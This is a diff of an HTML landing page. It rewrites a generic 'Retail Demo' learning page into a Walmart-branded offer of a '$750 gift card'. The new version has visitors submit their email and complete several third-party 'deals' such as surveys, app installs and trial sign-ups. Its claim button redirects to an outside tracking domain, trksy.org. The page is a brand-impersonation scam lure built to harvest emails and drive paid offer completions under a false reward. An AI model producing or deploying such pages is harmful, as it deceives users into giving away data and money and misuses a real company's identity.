@@ -2,144 +2,284 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Retail Demo Landing Page</title>
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Walmart – $750 Gift Card</title>
+<link href="https://googleapis.com" rel="stylesheet">
 
 <style>
 *{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
+margin:0;
+padding:0;
+box-sizing:border-box;
 }
 
 body{
-    font-family:Arial,sans-serif;
-    background:#f5f9ff;
-    color:#111827;
+font-family:'Inter',sans-serif;
+background:#f4f7fc;
+color:#000000;
 }
 
-.container{
-    max-width:460px;
-    margin:0 auto;
-    min-height:100vh;
-    background:#ffffff;
+.main-card{
+max-width:460px;
+margin:0 auto;
+min-height:100vh;
+background:#ffffff;
+padding-bottom:30px;
+box-shadow: 0 0 20px rgba(0,0,0,0.05);
 }
 
-.header{
-    padding:18px;
-    border-bottom:1px solid #dbeafe;
+/* HEADER */
+.topbar{
+background:#0071dc;
+padding:16px 18px;
+display:flex;
+align-items:center;
+justify-content:flex-start;
+border-bottom:1px solid #e5e5e5;
 }
 
-.logo{
-    font-size:24px;
-    font-weight:700;
-    color:#0053e2;
+.brand{
+font-size:22px;
+font-weight:700;
+letter-spacing:1px;
+text-transform: uppercase;
+color:#ffffff;
 }
 
-.hero{
-    text-align:center;
-    padding:40px 20px;
+/* MAIN TITLE */
+.hero-title{
+font-size:36px;
+line-height:1.1;
+font-weight:800;
+letter-spacing:-1.5px;
+text-align:center;
+padding:36px 18px 24px;
+color:#0071dc;
 }
 
-.hero h1{
-    font-size:38px;
-    line-height:1.1;
-    margin-bottom:12px;
+/* STEP CARDS & FAQ CARDS */
+.step-card, .faq-card{
+background:#ffffff;
+margin:0 18px 10px;
+border-radius:12px;
+padding:16px 20px;
+display:flex;
+gap:14px;
+align-items: flex-start;
+box-shadow:0 2px 8px rgba(0, 113, 220, 0.04);
+border: 1px solid #e1e8ed;
 }
 
-.hero p{
-    color:#64748b;
+.faq-card {
+cursor: pointer;
+flex-direction: column;
+gap: 0;
+transition: background 0.2s ease;
 }
 
-.card{
-    margin:12px 18px;
-    padding:18px;
-    border:1px solid #dbeafe;
-    border-radius:12px;
-    display:flex;
-    gap:12px;
+.faq-card:hover {
+background: #f4f7fc;
 }
 
-.icon{
-    width:26px;
-    height:26px;
-    border-radius:50%;
-    background:#0053e2;
-    color:white;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    font-weight:bold;
+/* ROUNDED CHECKMARK STYLE ICON */
+.step-num{
+width:24px;
+height:24px;
+border-radius:50%;
+background:#0071dc;
+color:#fff;
+display:flex;
+align-items:center;
+justify-content:center;
+font-size:12px;
+font-weight:700;
+flex-shrink:0;
+margin-top: 2px;
 }
 
-.card h3{
-    margin-bottom:4px;
+.step-content, .faq-content{
+width:100%;
 }
 
-.card p{
-    color:#64748b;
-    font-size:14px;
+.step-content h3, .faq-content h3{
+font-size:15px;
+font-weight:700;
+margin-bottom:3px;
+color:#000000;
+line-height:1.3;
 }
 
-.button-wrap{
-    padding:20px 18px;
+.step-content p{
+font-size:13px;
+color:#555555;
+line-height:1.45;
 }
 
-.btn{
-    width:100%;
-    padding:18px;
-    border:none;
-    border-radius:10px;
-    background:#0053e2;
-    color:white;
-    font-size:16px;
-    font-weight:700;
-    cursor:pointer;
+/* FAQ DYNAMIC DROPDOWN STYLING */
+.faq-content p {
+font-size:13px;
+color:#555555;
+line-height:1.4;
+max-height: 0;
+overflow: hidden;
+transition: max-height 0.25s ease-out, margin-top 0.25s ease;
+margin-top: 0;
+}
+
+.faq-card.active .faq-content p {
+max-height: 200px;
+margin-top: 8px;
+}
+
+/* FAQ SPECIFIC */
+.faq-title-main{
+font-size:22px;
+font-weight:800;
+color:#000000;
+margin:28px 18px 14px;
+letter-spacing: -0.5px;
+}
+
+.faq-header-row{
+display:flex;
+justify-content:space-between;
+align-items:center;
+width: 100%;
+}
+
+.faq-toggle-icon{
+font-size:18px;
+font-weight:700;
+color:#0071dc;
+line-height:1;
+margin-left:8px;
+user-select: none;
+}
+
+/* BUTTON SECTION */
+.btn-container{
+padding:16px 18px;
+text-align:center;
+}
+
+.cta-btn{
+width:100%;
+background:#ffc220;
+color:#000000;
+border:none;
+border-radius:8px;
+padding:18px;
+font-size:15px;
+font-weight:700;
+text-transform: uppercase;
+letter-spacing: 1px;
+margin-bottom:10px;
+cursor:pointer;
+box-shadow: 0 4px 12px rgba(255, 194, 32, 0.2);
+transition: opacity 0.2s ease;
+}
+
+.cta-btn:hover{
+opacity: 0.9;
+}
+
+.sub-text{
+font-size:11px;
+color:#888888;
+margin-bottom:12px;
 }
 </style>
 </head>
+
 <body>
 
-<div class="container">
+<div class="main-card">
 
-    <div class="header">
-        <div class="logo">Retail Brand</div>
-    </div>
+<div class="topbar">
+<div class="brand">Walmart</div>
+</div>
 
-    <div class="hero">
-        <h1>Blue Theme Demo Page</h1>
-        <p>A simple example for learning responsive HTML and CSS.</p>
-    </div>
+<div class="hero-title">
+Claim Your $750<br>Walmart HaulsCard
+</div>
 
-    <div class="card">
-        <div class="icon">1</div>
-        <div>
-            <h3>Step One</h3>
-            <p>Learn layout structure with Flexbox.</p>
-        </div>
-    </div>
+<div class="step-card">
+<div class="step-num">✓</div>
+<div class="step-content">
+<h3>Get My HaulsCard</h3>
+<p>Click the button below to head straight to the official reward page.</p>
+</div>
+</div>
 
-    <div class="card">
-        <div class="icon">2</div>
-        <div>
-            <h3>Step Two</h3>
-            <p>Customize colors, spacing, and typography.</p>
-        </div>
-    </div>
+<div class="step-card">
+<div class="step-num">✓</div>
+<div class="step-content">
+<h3>Enter Your Valid Email</h3>
+<p>Continue to the next page and submit your email to start.</p>
+</div>
+</div>
 
-    <div class="card">
-        <div class="icon">3</div>
-        <div>
-            <h3>Step Three</h3>
-            <p>Practice responsive design techniques.</p>
-        </div>
-    </div>
+<div class="step-card">
+<div class="step-num">✓</div>
+<div class="step-content">
+<h3>Complete 4–5 deals</h3>
+<p>Deals may include surveys, app installs, trial offers, or similar steps.</p>
+</div>
+</div>
 
-    <div class="button-wrap">
-        <button class="btn">Learn More</button>
-    </div>
+<div class="step-card">
+<div class="step-num">✓</div>
+<div class="step-content">
+<h3>Receive Your Reward</h3>
+<p>After completing the required Deals, you can qualify for your reward.</p>
+</div>
+</div>
+
+<!-- FAQ SECTION -->
+<div class="faq-title-main">Frequently Asked Questions</div>
+
+<div class="faq-card" onclick="toggleFaq(this)">
+<div class="faq-header-row">
+<div class="faq-content">
+<h3>What happens next?</h3>
+<p>You’ll be taken to the next page, where you’ll answer a few short questions, enter your email, and complete the featured Deals.</p>
+</div>
+<div class="faq-toggle-icon">+</div>
+</div>
+</div>
+
+<div class="faq-card" onclick="toggleFaq(this)">
+<div class="faq-header-row">
+<div class="faq-content">
+<h3>Is there any cost to enter?</h3>
+<p>Entering your email is free, but some required third-party deals may include trial sign-ups or optional purchases.</p>
+</div>
+<div class="faq-toggle-icon">+</div>
+</div>
+</div>
+
+<div class="btn-container">
+<button class="cta-btn" onclick="redirect()">Get My HaulsCard →</button>
+<div class="sub-text">Eligibility and completion requirements apply.</div>
+</div>
 
 </div>
+
+<script>
+function redirect(){
+window.location.href="https://trksy.org";
+}
+
+function toggleFaq(card) {
+    card.classList.toggle('active');
+    const icon = card.querySelector('.faq-toggle-icon');
+    if (card.classList.contains('active')) {
+        icon.textContent = '-';
+    } else {
+        icon.textContent = '+';
+    }
+}
+</script>
 
 </body>
 </html>
